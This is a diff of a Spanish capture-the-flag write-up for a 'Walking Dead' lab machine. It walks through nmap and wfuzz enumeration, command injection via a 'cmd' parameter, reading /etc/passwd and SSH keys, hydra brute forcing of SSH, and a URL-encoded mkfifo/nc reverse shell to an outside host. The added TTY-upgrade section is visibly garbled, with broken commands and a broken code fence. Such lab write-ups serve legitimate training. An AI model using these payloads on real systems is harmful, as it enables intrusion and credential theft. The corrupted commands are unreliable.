@@ -5,9 +5,10 @@
 ___
 
 #### FASE RECONOCIMIENTO
+
 1. **Escaneo**:
 
-1.1 Primero comenzamos con el _Objetivo_:
+1.1 Primero del _Objetivo_:
 
 ```
 nmap -v -n -sV -sV --min-rate 5000 -Pn --open -oN escaneo [IP]
@@ -26,7 +27,8 @@ nmap -v -n -sV -sV --min-rate 5000 -Pn --open -oN escaneo [IP]
 			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                           
 ```
 
-1.2 Ahora que ya sabemos que hay una _Aplicación Web_:
+1.2 Ahora que ya sabemos, de la _Web App_:
+
 * `whatweb [IP]`
 	* `http://172.18.0.3 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[172.18.0.3], Title[The Walking Dead - CTF]                      
 
@@ -35,58 +37,66 @@ nmap -v -n -sV -sV --min-rate 5000 -Pn --open -oN escaneo [IP]
 	+ /hidden/: Directory indexing found.                      
 	+ /hidden/: This might be interesting.                     
 
+
 2. Ahora pasamos a la Sub-Fase de **Enumeración**:
 	
 2.1  de la _Web App_:
-* Directorios:
-	- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -R 3 -u "http://172.18.0.3/FUZZ"`
-		- /hidden/	301				
+	* _Directorios:_
+		- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -R 3 -u "http://172.18.0.3/FUZZ"`
+			- /hidden/	301				
 		
-- _Recursos (PHP-HTML-TXT)_
-	- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u "http://172.18.0.3/FUZZ"`
-	- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt" -u "http://172.18.0.3/FUZZ.FUZ2Z"`
-		- /hidden/.shell.php    0 bytes   <==
-		- /index.html
-		- /backup.txt							200
-			- Error 403: Forbidden. Directory listing is disabled.	?
+	* _Recursos (PHP-HTML-TXT):_
+		- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u "http://172.18.0.3/FUZZ"`
+		- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt" -u "http://172.18.0.3/FUZZ.FUZ2Z"`
+			- /hidden/.shell.php    0 bytes   <==
+			- /index.html
+			- /backup.txt							200
+				- Error 403: Forbidden. Directory listing is disabled.	?
 			
-- Recursos Ocultos:
-	- `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/UnixDotfiles.fuzz.txt -u "http://172.18.0.3/hidden/FUZZ"`   	X                                   
-	- `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u "http://172.18.0.3/hidden/.FUZZ"`	X                                      
-	
-- Subdominios:
-	* `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -H "Host. FUZZ.[dominio]" -u "http://[dominio|IP]"`
+	* Recursos Ocultos:
+		* `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/UnixDotfiles.fuzz.txt -u "http://172.18.0.3/hidden/FUZZ"`   	X                                   
+		* `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u "http://172.18.0.3/hidden/.FUZZ"`	X              
+		
+	* Quizás encontremos _Subdominios_:
+		* `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -H "Host. FUZZ.[dominio]" -u "http://[dominio|IP]"`	X
 						
 				
 3. **Busqueda de Vulnerabilidades:**
     * _Descargar Lógica PHPs_:
-   		* Quizás podamos entender qué hace el script
-			* `curl -O http://[IP]/hidden/.shell.php`   X	
-		
+   		* Quizás podamos entender qué hace el script (aunque pesa 0 :S)
+			* `curl -O http://[IP]/hidden/.shell.php`	
+			* Comprobamos y efectivamente no hay nada.
+
 	* _Parámetros URL_:
 	    * Los más comunes:
-		    * `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt -u "http://[IP]/hidden/.shell.php?FUZZ=1"	`    X
-		    * `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../rockyou.txt -u "http://172.18.0.2/hidden/.shell.php?FUZZ=1"`    X
-		- Buscamos posible LFI:
-		    1. `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../lfi-params.txt -z file,/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -u "http://[IP]/hidden/.shell.php?FUZZ=FUZ2Z"`    X
+		    * `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt -u "http://[IP]/hidden/.shell.php?FUZZ=1"` 
+		    * `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../rockyou.txt -u "http://172.18.0.2/hidden/.shell.php?FUZZ=1"`
+        	* No devueven nada
+      
+		- Buscamos posible LFI
+		    1. `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../lfi-params.txt -z file,/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -u "http://[IP]/hidden/.shell.php?FUZZ=FUZ2Z"`
 		
-		    2. `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../lfi-params.txt -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.18.0.2/hidden/.shell.php?FUZZ=FUZ2Z"`      X
+		    2. `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../lfi-params.txt -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.18.0.2/hidden/.shell.php?FUZZ=FUZ2Z"`
+      		* Tampoco hallamos nada relevante para LFI
 					
 		* Otros:
 		    * `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u "http://[IP]/hidden/.shell.php?FUZZ=id"`
-                * cmd 200   (Inyección de Comandos OS)  <==             
+                * cmd 200 
+
+Haciendo distintas pruebas, vemos podemos **Inyectar Comandos del Sistema** a través del _Parámetro URL_. Este es nuestro camino.
 
 ___
 
 #### FASE EXPLOTACION
-* **Web:**
-    * _Enumerar Usuarios_:
-        * Navegador:
-                - http://[IP]/hidden/.shell.php?cmd=cat%20/etc/passwd
-                    - [IMG]
-                    - rick:     bash
-                    - negan:    bash
-* **Sistema:**
+Antes de lanzar nuestra WebShell podemos intentar algunas cosas para intentar hacer _Footprinting_, es decir obtener información más detallada. A través del navegador podemos, por ejemplo:
+
+**Explotación del Sistema**:
+	 * _Enumerar Usuarios:_       
+		- http://[IP]/hidden/.shell.php?cmd=cat%20/etc/passwd
+			- [IMG]
+			- rick:     bash
+			- negan:    bash
+
     * _Buscar Claves Privadas_:
         * Navegador:
                 * http://[IP]/hidden/.shell.php?cmd=cat%20/home/rick/.ssh/id_rsa    X
@@ -94,19 +104,20 @@ ___
                 * No funciona con ningún tipo de clave
     * _Brutear Contraseñas_:
         * hydra -L users.txt -P rockyou.txt ssh://[IP] -t 16 -V -u
-    
-    * Footholding:
-        * lanzar una RevShell:
-            * rlwrap nc -lnvp 6660
-                * /hidden/.shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20172.18.0.2%206660%20%3E%2Ftmp%2Ff
-            * Mejorar TTY:
-                * which python python3
-                * tty
-                * python3 -c 'import pty;pty.spawn("/bin/bash")'
-                * tty
-            * whoami ==> www-data
 
-___
+Ahora que ya probamos varias cosas sin resultados pasamos a hacer **Footholding** mediante nuestra _Reverse Shell_:
+
+* rlwrap nc -lnvp 6660
+	* /hidden/.shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20172.18.0.2%206660%20%3E%2Ftmp%2Ff
+ 
+ * Ahora mejoremos la TTY:
+```
+which python python3
+tty phon3 -c 'import pty;pty.spawn("/bin/bash")'
+	* t
+	* wami ==> www-data
+
+__```_
 		 
 #### FASE POST-EXPLOTACIÓN (Elevar Privilegios)
 * Listar un poco a los usuarios:
